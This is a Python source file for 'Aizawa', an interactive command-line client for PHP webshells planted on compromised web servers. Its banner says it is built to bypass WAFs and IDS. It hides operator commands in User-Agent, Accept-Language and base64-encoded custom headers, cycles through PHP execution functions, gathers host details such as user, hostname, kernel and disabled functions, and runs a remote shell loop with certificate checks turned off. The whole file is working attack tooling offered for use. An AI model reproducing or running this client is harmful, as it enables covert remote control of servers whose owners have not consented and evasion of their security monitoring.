#!/usr/bin/env python
######################################################
##                                                  ##
##                  A I Z A W A                     ##
##                                                  ##
## Simple command Line webshell by @elliottophellia ##
##                                                  ##
######################################################

# Imports

import re
import sys
import httpx
import base64
import validators

# Colors

bold = "\033[1m"
red = "\033[31m"
clear = "\033[0m"
cyan = "\033[36m"
blue = "\033[34m"
purple = "\033[35m"
green = "\033[32m"
yellow = "\033[33m"

# Functions

def http_request(client, method, url, headers=None, data=None):
    headers = headers or {}
    if method.lower() == 'get':
        r = client.get(url, headers=headers, follow_redirects=True)
    elif method.lower() == 'post':
        r = client.post(url, headers=headers, data=data, follow_redirects=True)
    else:
        raise ValueError(f"Invalid method: {method}")
    return r.text

def http_user_agent_get(client, url, cmd):
    headers = {"User-Agent": cmd}
    return http_request(client, 'get', url, headers)

def http_accept_language_get(client, url, cmd):
    headers = {"Accept-Language": cmd}
    return http_request(client, 'get', url, headers)

def http_user_agent_post(client, url, data, cmd):
    headers = {"User-Agent": cmd}
    return http_request(client, 'post', url, headers, data)

def http_accept_language_post(client, url, data, cmd):
    headers = {"Accept-Language": cmd}
    return http_request(client, 'post', url, headers, data)

def http_aizawa_ninja(client, url, cmd):
    headers = {"Aizawa-Ninja": base64.b64encode(cmd.encode('utf-8'))}
    return http_request(client, 'get', url, headers)

def execute(client, url, cmd, type):
    match type:
        case "ping":
            try:
                r = client.get(url, follow_redirects=True)
                if r.status_code != 200:
                    print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear + ': Invalid HTTP response code\nPlease check the URL and try again\n')
                    sys.exit()
            except httpx.RequestError as e:
                print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear + ': URL is not reachable\nPlease check the URL and try again\n')
                sys.exit()

        case "get":
            r = client.get(url+cmd, follow_redirects=True)
            result = r.text
            if not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "post":
            r = client.post(url, data=cmd, follow_redirects=True)
            result = r.text
            if not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_user_agent_get":
            result = http_user_agent_get(client, url + '?cmd=system', cmd)
            if not result:
                result = http_user_agent_get(client, url + '?cmd=proc_open', cmd)
            elif not result:
                result = http_user_agent_get(client, url + '?cmd=popen', cmd)
            elif not result:
                result = http_user_agent_get(client, url + '?cmd=passthru', cmd)
            elif not result:
                result = http_user_agent_get(client, url + '?cmd=shell_exec', cmd)
            elif not result:
                result = http_user_agent_get(client, url + '?cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_accept_language_get":
            result = http_accept_language_get(client, url + '?cmd=system', cmd)
            if not result:
                result = http_accept_language_get(client, url + '?cmd=proc_open', cmd)
            elif not result:
                result = http_accept_language_get(client, url + '?cmd=popen', cmd)
            elif not result:
                result = http_accept_language_get(client, url + '?cmd=passthru', cmd)
            elif not result:
                result = http_accept_language_get(client, url + '?cmd=shell_exec', cmd)
            elif not result:
                result = http_accept_language_get(client, url + '?cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_user_agent_post":
            result = http_user_agent_post(client, url, 'cmd=system', cmd)
            if not result:
                result = http_user_agent_post(client, url, 'cmd=proc_open', cmd)
            elif not result:
                result = http_user_agent_post(client, url, 'cmd=popen', cmd)
            elif not result:
                result = http_user_agent_post(client, url, 'cmd=passthru', cmd)
            elif not result:
                result = http_user_agent_post(client, url, 'cmd=shell_exec', cmd)
            elif not result:
                result = http_user_agent_post(client, url, 'cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_accept_language_post":
            result = http_accept_language_post(client, url, 'cmd=system', cmd)
            if not result:
                result = http_accept_language_post(client, url, 'cmd=proc_open', cmd)
            elif not result:
                result = http_accept_language_post(client, url, 'cmd=popen', cmd)
            elif not result:
                result = http_accept_language_post(client, url, 'cmd=passthru', cmd)
            elif not result:
                result = http_accept_language_post(client, url, 'cmd=shell_exec', cmd)
            elif not result:
                result = http_accept_language_post(client, url, 'cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_aizawa_ninja_eval":
            result = http_aizawa_ninja(client, url, 'system~' + cmd)
            if not result:
                result = http_aizawa_ninja(client, url, 'passthru~' + cmd)
            elif not result:
                result = http_aizawa_ninja(client, url, 'shell_exec~' + cmd)
            elif not result:
                result = http_aizawa_ninja(client, url, 'exec~' + cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

    if type in ["http_aizawa_ninja_concat", "http_aizawa_ninja_debug", "http_aizawa_ninja_gc", "http_aizawa_ninja_json", "http_aizawa_ninja_filter"]:
        result = http_aizawa_ninja(client, url, cmd)
        if not result:
            result = red + 'ERROR' + clear + '\n'
        return result
    
def banner():
    banner_text = yellow + '\n   ___   ________  ___ _      _____ \n  / _ | /  _/_  / / _ | | /| / / _ |\n / __ |_/ /  / /_' + blue + '/ __ | |/ |/ / __ |\n/_/ |_/___/ /___/_/ |_|__/|__/_/ |_|' + clear + '\n'
    banner_text += 'A Super Simple Command Line Webshell\nFor Bypassing Any Kind of WAF or IDS\n'
    banner_text += 'Code by ' + bold + '   @' + red + 'elliottophellia' + clear + '    '
    banner_text += bold + '#' + red + 'V' + purple + 'S' + blue + 'P' + yellow + 'O' + clear + '\n'
    print(banner_text)

def main():

    # Httpx Client

  with httpx.Client(verify=False) as client:

    # Get URL and check if valid

    url = sys.argv[1] if len(sys.argv) > 1 else input("Webshell URL: ")
    if not validators.url(url):
        print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear + ': Invalid URL format\nThis does not appear to be a valid URL/IP address\nPlease check the input and try again\n')
        sys.exit()

    # Remove any characters after the file extension

    regex = re.compile(r'^.*\.[a-zA-Z]+', re.MULTILINE)
    remove_char = regex.findall(url)
    url = remove_char[0]

    # Check if URL is alive and reachable

    execute(client, url, '', 'ping')

    # Get filename and strip the domain

    filename = url[url.rfind('/') + 1:]

    # Classify the webshell type based on the filename

    patterns_to_types = {
        r'get_aizawa_hal_(.*?)\.': 'http_accept_language_get',
        r'get_aizawa_hua_(.*?)\.': 'http_user_agent_get',
        r'post_aizawa_hal_(.*?)\.': 'http_accept_language_post',
        r'post_aizawa_hua_(.*?)\.': 'http_user_agent_post',
        r'aizawa_ninja_eval_(.*?)\.': 'http_aizawa_ninja_eval',
        r'aizawa_ninja_concat_(.*?)\.': 'http_aizawa_ninja_concat',
        r'aizawa_ninja_debug_(.*?)\.': 'http_aizawa_ninja_debug',
        r'aizawa_ninja_gc_(.*?)\.': 'http_aizawa_ninja_gc',
        r'aizawa_ninja_json_(.*?)\.': 'http_aizawa_ninja_json',
        r'aizawa_ninja_filter_(.*?)\.': 'http_aizawa_ninja_filter',
    }

    type = None

    for pattern, t in patterns_to_types.items():
        match = re.findall(pattern, filename)
        if match:
            type = t
            break

    if type is None:
        print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear + ': Invalid filename\nThis does not appear to be a valid Aizawa Webshell\nPlease check the URL and try again\n')
        sys.exit()

    # Get essential information

    # Get user and host

    user = execute(client, url, 'whoami', type)
    host = execute(client, url, 'hostname', type)
    pwd = execute(client, url, 'pwd', type)

    # Return default values if not found or error

    user = 'aizawaema' if not user or user == '\033[31mERROR\033[0m\n' else re.sub(r'\s+', '', user)
    host = 'virtualesport' if not host or host == '\033[31mERROR\033[0m\n' else re.sub(r'\s+', '', host)
    pwd = '~/unknown/path' if not pwd or pwd == '\033[31mERROR\033[0m\n' else re.sub(r'\s+', '', pwd)

    # Print essential information
    if type in ["http_aizawa_ninja_concat", "http_aizawa_ninja_debug", "http_aizawa_ninja_gc", "http_aizawa_ninja_json", "http_aizawa_ninja_filter"]:
        print(bold + green +
              'Successfully connected to Aizawa Webshell Ninja Edition!' + clear + '\n')
    else:
        print(bold + green + 'Successfully connected to Aizawa Webshell!' + clear + '\n')
        if type in ["http_accept_language_get", "http_user_agent_get"]:
            print(
                bold + 'Kernel           : ' + clear + execute(client, url, "?unamea", "get") + '\n' +
                bold + 'Server           : ' + clear + execute(client, url, "?server", "get") + '\n' +
                bold + 'Safe Mode        : ' + clear + execute(client, url, "?safe_mode", "get") + '\n' +
                bold + 'Server IP        : ' + clear + execute(client, url, "?server_ip", "get") + '\n' +
                bold + 'Client IP        : ' + clear + execute(client, url, "?client_ip", "get") + '\n' +
                bold + 'Disable Function : ' + clear +
                execute(client, url, "?disable_functions", "get") + '\n'
            )
        elif type in ["http_accept_language_post", "http_user_agent_post"]:
            print(
                bold + 'Kernel           : ' + clear + execute(client, url, "unamea", "post") + '\n' +
                bold + 'Server           : ' + clear + execute(client, url, "server", "post") + '\n' +
                bold + 'Safe Mode        : ' + clear + execute(client, url, "safe_mode", "post") + '\n' +
                bold + 'Server IP        : ' + clear + execute(client, url, "server_ip", "post") + '\n' +
                bold + 'Client IP        : ' + clear + execute(client, url, "client_ip", "post") + '\n' +
                bold + 'Disable Function : ' + clear +
                execute(client, url, "disable_functions", "post") + '\n'
            )

    # Initialize the shell

    while True:
        try:
            # Get command from user

            cmd = input(bold + yellow + user + clear + '@' + bold + blue + host + clear + ' ' + purple + pwd + clear + ' % ')
            if cmd == 'exit' or cmd == 'quit':
                sys.exit()
            if not cmd:
                continue

            # Execute command and print result

            print('\n' + cyan + execute(client, url, cmd, type) + clear)

        except KeyboardInterrupt:
            print("\nCtrl + C detected. Exiting...")
            sys.exit()

if __name__ == "__main__":

    # Print banner
    banner()

    # Run the script
    main()